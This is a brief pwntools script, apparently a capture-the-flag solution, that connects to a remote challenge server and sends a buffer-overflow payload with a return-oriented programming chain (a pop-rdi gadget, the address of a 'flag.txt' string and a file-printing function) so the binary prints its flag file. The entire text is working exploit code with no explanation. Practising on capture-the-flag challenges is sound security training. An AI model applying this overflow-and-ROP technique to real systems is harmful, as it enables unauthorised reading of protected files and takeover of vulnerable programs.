from pwn import *

#p = process('./challenge')
#gdb.attach(p, gdbscript='b *main+174')
p = remote("challs.nusgreyhats.org", 32835)

poprdi = 0x0000000000400c13 #: pop rdi ; ret
flagtxt = 0x0000000000400c59 #: flag.txt
printfile = 0x00000000004009a7
pload = b'bob.txt\x00' + b'A'*(16*8) + p64(poprdi) + p64(flagtxt) + p64(poprdi+1) + p64(printfile)
p.recvuntil(b"input copypasta to read: ")
p.sendline(pload)
p.interactive()
